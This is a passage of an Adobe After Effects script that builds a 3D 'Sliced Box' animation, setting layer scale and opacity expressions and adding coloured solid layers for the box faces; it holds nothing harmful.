                '")("Random Seed");' +
                "\nif (CHK == true) {" +
                "\nseedRandom(R+ID)" +
                "\nvalue+[wiggle(0,2*ZO)]" +
                "\n}else if ((CI%2 == 0)&&(RI%2 == 0)){" +
                "\nvalue-ZO" +
                "\n}else if ((CI%2 != 0)&&(RI%2 == 0)){" +
                "\nvalue+ZO" +
                "\n}else if ((CI%2 == 0)&&(RI%2 != 0)){" +
                "\nvalue+ZO" +
                "\n}else if ((CI%2 != 0)&&(RI%2 != 0)){" +
                "\nvalue-ZO}";
            }
          }
          function _setScaleExpressions() {
            var PiecesCount = SBColumns * SBRows;
            var layerIndex = mainComp.layer(
              "Piece" + PiecesCount + "_SS_SlicedBox",
            ).index;
            layerIndex = layerIndex - PiecesCount;
            SI = layerIndex;
            var CompW = mainComp.width / 2;
            var CompH = mainComp.height / 2;
            var selectedLayerName = mainComp.layer(
              PiecesCount * 2 + 1 + SI,
            ).name;
            for (var l = PiecesCount; l <= PiecesCount * 2; l++) {
              mainComp.layer(l + SI).transform.Scale.expression =
                'ZS= comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Extrusion");' +
                "\n [value[0],value[1],ZS]";
            }
            for (var l = 0; l <= PiecesCount; l += 1) {
              mainComp.layer(l + SI + 1).transform.Opacity.expression =
                'T= thisComp.layer("' +
                selectedLayerName +
                '").transform.opacity;' +
                '\nSBFrOp = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Front Opacity");' +
                "\nif ((T==0)&&(SBFrOp!=0)) { SBFrOp }else { 0 };";
            }
            for (var l = PiecesCount; l <= PiecesCount * 2; l++) {
              mainComp.layer(l + SI + 1).transform.Opacity.expression =
                'T= thisComp.layer("' +
                selectedLayerName +
                '").transform.opacity;' +
                '\nSBFrOp = comp("' +
                CompName +
                '").layer("' +
                ControlsLayerName +
                '").effect("' +
                SlicedBoxEffectName +
                '")("Front Opacity");' +
                "\nif ((T==0) && (SBFrOp!=0)){100}else{0}";
            }
            for (var l = 1; l <= PiecesCount; l += 1) {
              if (SBRows == 1 && SBColumns % 2 == 0) {
                mainComp.layer(l + SI).transform.Scale.expression =
                  ' ID = effect("ID")(1);\n CI= effect("Column ID")(1);\n src= comp("' +
                  CompName +
                  '").layer("' +
                  ControlsLayerName +
                  '");' +
                  '\n n1 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Reverse");' +
                  '\n n2 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Middle to Sides");' +
                  '\n n3 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Sides to Middle");' +
                  '\n i = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Offset");' +
                  '\n US = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Boxes Scale");' +
                  '\n ESQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Enable");' +
                  '\n SQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Scale");' +
                  '\n d = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Zero Minimum");' +
                  "\n M=" +
                  SBColumns +
                  "/2;" +
                  "\n MF=M/(M-1);" +
                  "\n if(M>1) {MF=M/(M-1)} else{ MF=M;}" +
                  "\n if (CI<=M){" +
                  "\n  inx3=ID+(MF);" +
                  "\n  inx2=((M+1)-ID)+(MF);" +
                  "\n }else if (CI>M){" +
                  "\n  inx3=((" +
                  SBColumns +
                  "+1)" +
                  "-ID)+(MF);" +
                  "\n  inx2=ID-M+MF};" +
                  "\n if (n3 == true) {" +
                  "\n  inx = inx3" +
                  "\n } else if (n2 == true) {" +
                  "\n  inx = inx2" +
                  "\n }else if (n1 == true) {" +
                  "\n  inx = (" +
                  SBColumns +
                  "+1)" +
                  "-ID" +
                  "\n } else { inx = ID };" +
                  "\n  f =.5;" +
                  "\n if ( ((n3==true)&&(d==true)) || ((n2==true)&&(d==true)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount / 2 +
                  "+MF)*i/f;" +
                  "\n }else if ( ((n3==true)&&(d==false)) || ((n2==true)&&(d==false)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-(" +
                  PiecesCount / 2 +
                  "+MF)*i)/f;" +
                  "\n }else if (d==true){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount +
                  ")*i/f;" +
                  "\n }else{" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-" +
                  PiecesCount +
                  "*i)/f;}" +
                  "\n if (d==true){" +
                  "\n  SQL = linear(SQ,0,100,ssmn,ssmx);" +
                  "\n }else{" +
                  "\n  SQL = linear(SQ,-100,100,ssmn,ssmx);}" +
                  "\n s = (f* SQL)+ (i*inx);" +
                  "\n if (s>100) { " +
                  "\n  t= [100,100,100] " +
                  "\n } else if ((s<0)&&(d==true)) {" +
                  "\n  t = [0,0,0] " +
                  "\n } else if (s<-100) { " +
                  "\n  t = [-100,-100,-100] " +
                  "\n } else if (s<100) { " +
                  "\n  t = [s,s,s]" +
                  "\n }else{" +
                  "\n  t= [100,100,100]}" +
                  "\n if (ESQ == false) {" +
                  "\n  [US,US,US]" +
                  "\n } else if (ESQ == true) {" +
                  "\n  t}";
              } else if (SBRows == 1 && SBColumns % 2 != 0) {
                mainComp.layer(l + SI).transform.Scale.expression =
                  ' ID = effect("ID")(1);\n CI= effect("Column ID")(1);\n src= comp("' +
                  CompName +
                  '").layer("' +
                  ControlsLayerName +
                  '");' +
                  '\n n1 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Reverse");' +
                  '\n n2 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Middle to Sides");' +
                  '\n n3 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Sides to Middle");' +
                  '\n i = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Offset");' +
                  '\n US = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Boxes Scale");' +
                  '\n ESQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Enable");' +
                  '\n SQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Scale");' +
                  '\n d = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Zero Minimum");' +
                  "\n M=(" +
                  SBColumns +
                  "+1)" +
                  "/2;" +
                  "\n if (CI<=M){" +
                  "\n  inx3=ID;" +
                  "\n  inx2=((M+1)-ID);" +
                  "\n }else if (CI>M){" +
                  "\n  inx3=(" +
                  SBColumns +
                  "+1)" +
                  "-ID;" +
                  "\n  inx2=ID-M+1};" +
                  "\n if (n3 == true) {" +
                  "\n  inx = inx3" +
                  "\n } else if (n2 == true) {" +
                  "\n  inx = inx2" +
                  "\n }else if (n1 == true) {" +
                  "\n  inx = (" +
                  SBColumns +
                  "+1)" +
                  "-ID" +
                  "\n } else { inx = ID };" +
                  "\n  f = .5;" +
                  "\n if ( ((n3==true)&&(d==true)) || ((n2==true)&&(d==true)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount / 2 +
                  "+.5)*i/f;" +
                  "\n }else if ( ((n3==true)&&(d==false)) || ((n2==true)&&(d==false)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-(" +
                  PiecesCount / 2 +
                  "+.5)*i)/f;" +
                  "\n }else if (d==true){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount +
                  ")*i/f;" +
                  "\n }else{" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-" +
                  PiecesCount +
                  "*i)/f;}" +
                  "\n if (d==true){" +
                  "\n  SQL = linear(SQ,0,100,ssmn,ssmx);" +
                  "\n }else{" +
                  "\n  SQL = linear(SQ,-100,100,ssmn,ssmx);}" +
                  "\n s = (f* SQL)+ (i*inx);" +
                  "\n if (s>100) { " +
                  "\n  t= [100,100,100] " +
                  "\n } else if ((s<0)&&(d==true)) {" +
                  "\n  t = [0,0,0] " +
                  "\n } else if (s<-100) { " +
                  "\n  t = [-100,-100,-100] " +
                  "\n } else if (s<100) { " +
                  "\n  t = [s,s,s]" +
                  "\n }else{" +
                  "\n  t= [100,100,100]}" +
                  "\n if (ESQ == false) {" +
                  "\n  [US,US,US]" +
                  "\n } else if (ESQ == true) {" +
                  "\n  t}";
              } else if (SBColumns == 1 && SBRows % 2 == 0) {
                mainComp.layer(l + SI).transform.Scale.expression =
                  'ID = effect("ID")(1);\n RI= effect("Row ID")(1);\n src= comp("' +
                  CompName +
                  '").layer("' +
                  ControlsLayerName +
                  '");' +
                  '\n n1 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Reverse");' +
                  '\n n2 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Middle to Sides");' +
                  '\n n3 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Sides to Middle");' +
                  '\n i = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Offset");' +
                  '\n US = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Boxes Scale");' +
                  '\n ESQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Enable");' +
                  '\n SQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Scale");' +
                  '\n d = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Zero Minimum");' +
                  "\n M=" +
                  SBRows +
                  "/2;" +
                  "\n MF=M/(M-1);" +
                  "\n if(M>1) {MF=M/(M-1)} else{ MF=M};" +
                  "\n if (RI<=M){" +
                  "\n inx3=ID+(MF);" +
                  "\n inx2=((M+1)-ID)+(MF);" +
                  "\n }else if (RI>M){" +
                  "\n inx3=((" +
                  SBRows +
                  "+1)" +
                  "-ID)+(MF);" +
                  "\n inx2=ID-M+MF};" +
                  "\n if (n3 == true) {" +
                  "\n inx = inx3" +
                  "\n } else if (n2 == true) {" +
                  "\n inx = inx2" +
                  "\n }else if (n1 == true) {" +
                  "\n inx = (" +
                  SBRows +
                  "+1)" +
                  "-ID" +
                  "\n } else { inx = ID };" +
                  "\n f = .5;" +
                  "\n if ( ((n3==true)&&(d==true)) || ((n2==true)&&(d==true)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount / 2 +
                  "+MF)*i/f;" +
                  "\n }else if ( ((n3==true)&&(d==false)) || ((n2==true)&&(d==false)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-(" +
                  PiecesCount / 2 +
                  "+MF)*i)/f;" +
                  "\n }else if (d==true){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount +
                  ")*i/f;" +
                  "\n }else{" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-" +
                  PiecesCount +
                  "*i)/f;}" +
                  "\n if (d==true){" +
                  "\n  SQL = linear(SQ,0,100,ssmn,ssmx);" +
                  "\n }else{" +
                  "\n  SQL = linear(SQ,-100,100,ssmn,ssmx);}" +
                  "\n s = (f* SQL)+ (i*inx);" +
                  "\n if (s>100) { " +
                  "\n t= [100,100,100] " +
                  "\n } else if ((s<0)&&(d==true)) {" +
                  "\n  t = [0,0,0] " +
                  "\n } else if (s<-100) { " +
                  "\n t = [-100,-100,-100] " +
                  "\n } else if (s<100) { " +
                  "\n  t = [s,s,s]" +
                  "\n }else{" +
                  "\n  t= [100,100,100]}" +
                  "\n if (ESQ == false) {" +
                  "\n [US,US,US]" +
                  "\n } else if (ESQ == true) {" +
                  "\n t}";
              } else if (SBColumns == 1 && SBRows % 2 != 0) {
                mainComp.layer(l + SI).transform.Scale.expression =
                  ' ID = effect("ID")(1);\n RI= effect("Row ID")(1);\n src= comp("' +
                  CompName +
                  '").layer("' +
                  ControlsLayerName +
                  '");' +
                  '\n n1 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Reverse");' +
                  '\n n2 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Middle to Sides");' +
                  '\n n3 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Sides to Middle");' +
                  '\n i = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Offset");' +
                  '\n US = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Boxes Scale");' +
                  '\n ESQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Enable");' +
                  '\n SQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Scale");' +
                  '\n d = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Zero Minimum");' +
                  "\n M=(" +
                  SBRows +
                  "+1)" +
                  "/2;" +
                  "\n if (RI<=M){" +
                  "\n inx3=ID;" +
                  "\n inx2=((M+1)-ID);" +
                  "\n }else if (RI>M){" +
                  "\n inx3=(" +
                  SBRows +
                  "+1)" +
                  "-ID;" +
                  "\n inx2=ID-M+1};" +
                  "\n if (n3 == true) {" +
                  "\n inx = inx3" +
                  "\n } else if (n2 == true) {" +
                  "\n inx = inx2" +
                  "\n }else if (n1 == true) {" +
                  "\n inx = (" +
                  SBRows +
                  "+1)" +
                  "-ID" +
                  "\n } else { inx = ID };" +
                  "\n f = .5;" +
                  "\n if ( ((n3==true)&&(d==true)) || ((n2==true)&&(d==true)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount / 2 +
                  "+.5)*i/f;" +
                  "\n }else if ( ((n3==true)&&(d==false)) || ((n2==true)&&(d==false)) ){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-(" +
                  PiecesCount / 2 +
                  "+.5)*i)/f;" +
                  "\n }else if (d==true){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount +
                  ")*i/f;" +
                  "\n }else{" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-" +
                  PiecesCount +
                  "*i)/f;}" +
                  "\n if (d==true){" +
                  "\n  SQL = linear(SQ,0,100,ssmn,ssmx);" +
                  "\n }else{" +
                  "\n  SQL = linear(SQ,-100,100,ssmn,ssmx);}" +
                  "\n s = (f* SQL)+ (i*inx);" +
                  "\n if (s>100) { " +
                  "\n t= [100,100,100] " +
                  "\n } else if ((s<0)&&(d==true)) {" +
                  "\n  t = [0,0,0] " +
                  "\n } else if (s<-100) { " +
                  "\n t = [-100,-100,-100] " +
                  "\n } else if (s<100) { " +
                  "\n  t = [s,s,s]" +
                  "\n }else{" +
                  "\n  t= [100,100,100]}" +
                  "\n if (ESQ == false) {" +
                  "\n [US,US,US]" +
                  "\n } else if (ESQ == true) {" +
                  "\n t}";
              } else {
                mainComp.layer(l + SI).transform.Scale.expression =
                  ' ID = effect("ID")(1);\n src= comp("' +
                  CompName +
                  '").layer("' +
                  ControlsLayerName +
                  '");' +
                  '\n n1 = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Reverse");' +
                  '\n i = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Offset");' +
                  '\n US = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Boxes Scale");' +
                  '\n ESQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Enable");' +
                  '\n SQ = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Scale");' +
                  '\n d = src.effect("' +
                  SlicedBoxEffectName +
                  '")("Zero Minimum");' +
                  "\n if (n1 == true) {" +
                  "\n  inx = (" +
                  PiecesCount +
                  1 +
                  ")-ID" +
                  "\n } else { inx = ID };" +
                  "\n  f =.5;" +
                  "\n if (d==true){" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn= -(" +
                  PiecesCount +
                  ")*i/f;" +
                  "\n }else{" +
                  "\n  ssmx= (100-i)/f;" +
                  "\n  ssmn=(-100-" +
                  PiecesCount +
                  "*i)/f;}" +
                  "\n if (d==true){" +
                  "\n  SQL = linear(SQ,0,100,ssmn,ssmx);" +
                  "\n }else{" +
                  "\n  SQL = linear(SQ,-100,100,ssmn,ssmx);}" +
                  "\n s = (f* SQL)+ (i*inx);" +
                  "\n if (s>100) { " +
                  "\n  t= [100,100,100] " +
                  "\n } else if ((s<0)&&(d==true)) {" +
                  "\n  t = [0,0,0] " +
                  "\n } else if (s<-100) { " +
                  "\n  t = [-100,-100,-100] " +
                  "\n } else if (s<100) { " +
                  "\n  t = [s,s,s]" +
                  "\n }else{" +
                  "\n  t= [100,100,100]}" +
                  "\n if (ESQ == false) {" +
                  "\n  [US,US,US]" +
                  "\n } else if (ESQ == true) {" +
                  "\n  t}";
              }
            }
          }
          function _finalPrecomposing() {
            var SlicesControlName = "MainBoxControls_SlicedBox_" + Num_SB;
            var PiecesCount = SBColumns * SBRows;
            var layerIndex = mainComp.layer(
              "Piece" + PiecesCount + "_SS_SlicedBox",
            ).index;
            layerIndex = layerIndex - PiecesCount;
            SI = layerIndex;
            var pixelAspect = mainComp.pixelAspect;
            var pA = pixelAspect - 1;
            var LW = mainComp.layer(2 * PiecesCount + SI + 1).width;
            var LH = mainComp.layer(2 * PiecesCount + SI + 1).height;
            var CompW = mainComp.width / 2;
            var CompH = mainComp.height / 2;
            var BD = parseInt(BoxWidthSB);
            var pD = Math.round(BD * pA);
            var ORE =
              'scr = comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '");' +
              '\nSBFrOp= scr.effect("' +
              SlicedBoxEffectName +
              '")("Front Opacity");' +
              '\ny = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation Y");' +
              '\nz = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation Z");' +
              "\nyi=y/360;" +
              "\nzi=z/360;" +
              '\nxo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset X")/360;' +
              '\nyo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset Y")/360;' +
              '\nzo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset Z")/360;' +
              '\nPY = scr.effect("' +
              SlicedBoxEffectName +
              '")("Y Displace");' +
              '\nPZ= scr.effect("' +
              SlicedBoxEffectName +
              '")("Z Displace");' +
              '\nPX = scr.effect("' +
              SlicedBoxEffectName +
              '")("X Displace");' +
              '\nus =scr.effect("' +
              SlicedBoxEffectName +
              '")("Boxes Scale");' +
              '\nss = scr.effect("' +
              SlicedBoxEffectName +
              '")("Scale");' +
              '\nENQ =scr.effect("' +
              SlicedBoxEffectName +
              '")("Enable");' +
              "\nif (yi % 1 != 0){0" +
              "\n} else if (zi % 1 != 0){0" +
              "\n} else if (xo%1 !=0) {0" +
              "\n} else if (yo%1!=0) {0" +
              "\n} else if (zo%1!=0) {0" +
              "\n} else if (PZ != 0){0" +
              "\n} else if (PY != 0){0" +
              "\n} else if (PX != 0){0" +
              "\n} else if ((us!=100) && (ss==100) && (ENQ==true)) {SBFrOp" +
              "\n} else if (us!=100){0 " +
              "\n} else if ((ss<100)&& (ENQ==true)){0 " +
              "\n}else{SBFrOp}";
            var OCE =
              'scr = comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '");' +
              '\nSBFrOp= scr.effect("' +
              SlicedBoxEffectName +
              '")("Front Opacity");' +
              '\nx = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation X");' +
              '\nz = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation Z");' +
              "\nxi=x/360;" +
              "\nzi=z/360;" +
              '\nxo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset X")/360;' +
              '\nyo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset Y")/360;' +
              '\nzo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset Z")/360;' +
              '\nPY = scr.effect("' +
              SlicedBoxEffectName +
              '")("Y Displace");' +
              '\nPZ= scr.effect("' +
              SlicedBoxEffectName +
              '")("Z Displace");' +
              '\nPX = scr.effect("' +
              SlicedBoxEffectName +
              '")("X Displace");' +
              '\nus =scr.effect("' +
              SlicedBoxEffectName +
              '")("Boxes Scale");' +
              '\nss = scr.effect("' +
              SlicedBoxEffectName +
              '")("Scale");' +
              '\nENQ =scr.effect("' +
              SlicedBoxEffectName +
              '")("Enable");' +
              "\nif (xi % 1 != 0){0" +
              "\n} else if (zi % 1 != 0){0" +
              "\n} else if (xo%1 !=0) {0" +
              "\n} else if (yo%1!=0) {0" +
              "\n} else if (zo%1!=0) {0" +
              "\n} else if (PZ != 0){0" +
              "\n} else if (PY != 0){0" +
              "\n} else if (PX != 0){0" +
              "\n} else if ((us!=100) && (ss==100) && (ENQ==true)) {SBFrOp" +
              "\n} else if (us!=100){0 " +
              "\n} else if ((ss<100)&& (ENQ==true)){0 " +
              "\n}else{SBFrOp}";
            var ORCE =
              'scr = comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '");' +
              '\nSBFrOp= scr.effect("' +
              SlicedBoxEffectName +
              '")("Front Opacity");' +
              '\nx = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation X");' +
              '\ny = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation Y");' +
              '\nz = scr.effect("' +
              SlicedBoxEffectName +
              '")("Rotation Z");' +
              "\nxi=x/360;" +
              "\nyi=y/360;" +
              "\nzi=z/360;" +
              '\nxo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset X")/360;' +
              '\nyo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset Y")/360;' +
              '\nzo = scr.effect("' +
              SlicedBoxEffectName +
              '")("Offset Z")/360;' +
              '\nPY = scr.effect("' +
              SlicedBoxEffectName +
              '")("Y Displace");' +
              '\nPZ= scr.effect("' +
              SlicedBoxEffectName +
              '")("Z Displace");' +
              '\nPX = scr.effect("' +
              SlicedBoxEffectName +
              '")("X Displace");' +
              '\nus =scr.effect("' +
              SlicedBoxEffectName +
              '")("Boxes Scale");' +
              '\nss = scr.effect("' +
              SlicedBoxEffectName +
              '")("Scale");' +
              '\nENQ =scr.effect("' +
              SlicedBoxEffectName +
              '")("Enable");' +
              "\nif (yi % 1 != 0){0" +
              "\n} else if (xi % 1 != 0){0" +
              "\n} else if (zi % 1 != 0){0" +
              "\n} else if (xo%1 !=0) {0" +
              "\n} else if (yo%1!=0) {0" +
              "\n} else if (zo%1!=0) {0" +
              "\n} else if (PZ != 0){0" +
              "\n} else if (PY != 0){0" +
              "\n} else if (PX != 0){0" +
              "\n} else if ((us!=100) && (ss==100) && (ENQ==true)) {SBFrOp" +
              "\n} else if (us!=100){0 " +
              "\n} else if ((ss<100)&& (ENQ==true)){0 " +
              "\n}else{SBFrOp}";
            MasterTopSide = mainComp.layers.addSolid(
              [0, 0.19, 0.69],
              "Top",
              LW,
              BD + pD,
              pixelAspect,
            );
            var CCEN = MasterTopSide.Effects.addProperty("ADBE Color Control");
            colorCtrlName = CCEN.name;
            CCEN.remove();
            MasterTopSide.threeDLayer = true;
            MasterTopSide.transform.orientation.setValue([90, 0, 0]);
            MasterTopSide.transform.position.setValue([
              CompW,
              CompH - 0.5 * LH,
              0,
            ]);
            FillEffect1 = MasterTopSide.Effects.addProperty("ADBE Fill");
            FillEffect1(3).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Color")';
            BCeffect1 = MasterTopSide.Effects.addProperty(
              "ADBE Brightness & Contrast",
            );
            BCeffect1(1).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              TBrP +
              ")";
            BCeffect1(2).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              TConP +
              ")";
            MasterTopSide.transform.anchorPoint.setValue([LW / 2, 0, 0]);
            MasterTopSide.transform.position.setValue([
              CompW,
              CompH - 0.5 * LH,
              0,
            ]);
            MasterTopSide.transform.scale.expression =
              'ZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n [value[0],ZS,value[2]]";
            MasterBottomSide = mainComp.layers.addSolid(
              [0, 0.19, 0.69],
              "Bottom",
              LW,
              BD + pD,
              pixelAspect,
            );
            MasterBottomSide.threeDLayer = true;
            MasterBottomSide.transform.orientation.setValue([90, 0, 0]);
            FillEffect2 = MasterBottomSide.Effects.addProperty("ADBE Fill");
            FillEffect2(3).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Color")';
            BCeffect2 = MasterBottomSide.Effects.addProperty(
              "ADBE Brightness & Contrast",
            );
            BCeffect2(1).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              BoBrP +
              ")";
            BCeffect2(2).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              BoConP +
              ")";
            MasterBottomSide.transform.anchorPoint.setValue([LW / 2, 0, 0]);
            MasterBottomSide.transform.position.setValue([
              CompW,
              CompH + 0.5 * LH,
              0,
            ]);
            MasterBottomSide.transform.scale.expression =
              'ZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n [value[0],ZS,value[2]]";
            MasterRightSide = mainComp.layers.addSolid(
              [0, 0.19, 0.69],
              "Right",
              BD,
              LH,
              pixelAspect,
            );
            MasterRightSide.threeDLayer = true;
            MasterRightSide.transform.orientation.setValue([0, 90, 0]);
            FillEffect3 = MasterRightSide.Effects.addProperty("ADBE Fill");
            FillEffect3(3).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Color")';
            BCeffect3 = MasterRightSide.Effects.addProperty(
              "ADBE Brightness & Contrast",
            );
            BCeffect3(1).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              RBrP +
              ")";
            BCeffect3(2).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              RConP +
              ")";
            MasterRightSide.transform.position.setValue([
              CompW + 0.5 * LW,
              CompH,
              0,
            ]);
            MasterRightSide.transform.anchorPoint.setValue([BD, 0.5 * LH, 0]);
            MasterRightSide.transform.scale.expression =
              'ZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n [ZS,value[1],value[2]]";
            MasterLeftSide = mainComp.layers.addSolid(
              [0, 0.19, 0.69],
              "Left",
              BD,
              LH,
              pixelAspect,
            );
            MasterLeftSide.threeDLayer = true;
            MasterLeftSide.transform.orientation.setValue([0, 90, 0]);
            FillEffect4 = MasterLeftSide.Effects.addProperty("ADBE Fill");
            FillEffect4(3).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Color")';
            BCeffect4 = MasterLeftSide.Effects.addProperty(
              "ADBE Brightness & Contrast",
            );
            BCeffect4(1).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              LBrP +
              ")";
            BCeffect4(2).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              LConP +
              ")";
            MasterLeftSide.transform.position.setValue([
              CompW - 0.5 * LW,
              CompH,
              0,
            ]);
            MasterLeftSide.transform.anchorPoint.setValue([BD, 0.5 * LH, 0]);
            MasterLeftSide.transform.scale.expression =
              'ZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n [ZS,value[1],value[2]]";
            MasterBackSide = mainComp.layers.addSolid(
              [0, 0.19, 0.69],
              "Back",
              LW,
              LH,
              pixelAspect,
            );
            MasterBackSide.threeDLayer = true;
            FillEffect5 = MasterBackSide.Effects.addProperty("ADBE Fill");
            FillEffect5(3).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Color")';
            BCeffect5 = MasterBackSide.Effects.addProperty(
              "ADBE Brightness & Contrast",
            );
            BCeffect5(1).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              BaBrP +
              ")";
            BCeffect5(2).expression =
              'comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")(' +
              BaConP +
              ")";
            MasterBackSide.transform.position.setValue([CompW, CompH, BD + pD]);
            MasterBackSide.transform.anchorPoint.expression =
              'ZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n APZ=value[2]-((ZS/100)-1)*" +
              BD +
              pD +
              ";" +
              "\n [value[0],value[1],APZ]";
            MasterBackSide.transform.scale.expression =
              'ZS= comp("' +
              CompName +
              '").layer("' +
              ControlsLayerName +
              '").effect("' +
              SlicedBoxEffectName +
              '")("Extrusion");' +
              "\n if (ZS == 0 ){[value[0],value[1],0]}else{[value[0],value[1],value[2]]}";
            var selectedLayerName = mainComp.layer(
              PiecesCount * 2 + 6 + SI,
            ).name;
            for (var l = 1; l <= 5; l += 1) {
